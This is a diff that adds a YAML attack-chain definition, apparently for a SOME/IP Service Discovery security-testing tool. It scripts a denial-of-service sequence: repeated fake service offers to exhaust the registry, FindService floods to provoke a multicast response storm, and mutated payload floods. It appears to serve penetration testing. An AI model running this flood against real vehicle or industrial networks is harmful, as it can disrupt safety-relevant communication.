@@ -1,0 +1,41 @@
+id: AC-002
+name: DoS 资源耗尽攻击链
+description: >
+  海量注册随机服务实例，耗尽服务注册表内存；
+  随后发送大量 FindService 请求触发广播响应风暴，拥塞 SD 多播网络。
+severity: high
+cvss: 7.5
+
+steps:
+  - id: flood_register
+    action: send
+    template: sd_offer
+    params:
+      service_id: "0xFFFE"
+      instance_id: "0x0001"
+      addr: "192.168.1.1"
+      port: 30509
+      ttl: 3600
+    repeat: 200
+    delay_ms: 5
+
+  - id: flood_findservice
+    action: send
+    template: sd_find
+    params:
+      service_id: "0xFFFF"
+      instance_id: "0xFFFF"
+    repeat: 500
+    delay_ms: 2
+
+  - id: mutate_payload_flood
+    action: mutate
+    params:
+      service_id: "0x1234"
+      layer: 1
+    repeat: 100
+    delay_ms: 1
+
+success_criteria:
+  flood_register_completed: true
+  mutate_payload_flood_completed: true
